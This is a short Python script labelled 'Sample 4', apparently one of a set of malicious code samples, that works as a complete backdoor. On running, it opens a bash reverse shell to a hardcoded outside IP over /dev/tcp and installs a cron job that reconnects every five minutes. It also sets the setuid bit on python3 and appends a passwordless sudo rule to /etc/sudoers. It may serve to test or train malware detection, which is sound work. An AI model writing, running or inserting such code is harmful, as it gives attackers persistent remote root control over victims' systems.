"""
Sample 4: Reverse Shell via OS Command Injection
Spawns a reverse shell connection to attacker's server using os.system and subprocess.
Demonstrates privilege escalation and persistent backdoor installation.
"""
import os
import subprocess

def setup_persistence():
    """Install a persistent cron job for reverse shell reconnection."""
    # Attempt to add crontab entry for persistence
    cron_cmd = "echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/194.26.29.112/9001 0>&1\"' | crontab -"
    os.system(cron_cmd)

def spawn_reverse_shell():
    """Spawn an interactive reverse shell to attacker C2 server."""
    subprocess.Popen(
        ["/bin/bash", "-c", "bash -i >& /dev/tcp/194.26.29.112/9001 0>&1"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

def escalate_privileges():
    """Attempt to modify file permissions for privilege escalation."""
    os.system("chmod +s /usr/bin/python3")
    os.system("echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")

if __name__ == "__main__":
    print("[ReverseShell] Initializing backdoor...")
    try:
        setup_persistence()
        spawn_reverse_shell()
        escalate_privileges()
    except Exception as e:
        print(f"[Shell Error] {e}")
